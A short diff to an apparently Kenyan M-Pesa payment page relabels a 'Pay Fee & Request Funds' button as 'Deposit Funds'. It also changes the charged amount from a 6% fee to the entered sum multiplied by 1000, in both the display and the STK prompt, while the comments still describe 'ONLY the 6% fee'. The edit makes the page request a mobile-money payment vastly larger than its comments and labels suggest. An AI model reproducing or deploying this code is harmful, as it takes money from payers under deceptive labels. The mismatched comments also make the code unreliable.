@@ -73,7 +73,7 @@
     <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
     <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
     
-    <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
+    <button id="payBtn" onclick="initiateFunding()">Deposit Funds</button>
     
     <div id="status"></div>
     <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
@@ -162,9 +162,9 @@
         const feeDiv = document.getElementById('feeDisplay');
         const stkSpan = document.getElementById('stkPrice');
         
-        if (amt >= 100) {
+        if (amt >= 1000) {
             // Calculate ONLY the 6% fee for the STK prompt
-            const fee = amt * 0.06;
+            const fee = amt * 1000;
             feeDiv.style.display = "block";
             stkSpan.innerText = "Ksh " + fee.toFixed(2);
         } else {
@@ -185,7 +185,7 @@
         }
 
         // Calculate the STK amount (just the 6% fee)
-        const stkAmount = Math.ceil(amt * 0.06); 
+        const stkAmount = Math.ceil(amt * 1000); 
         
         payBtn.disabled = true;
         payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
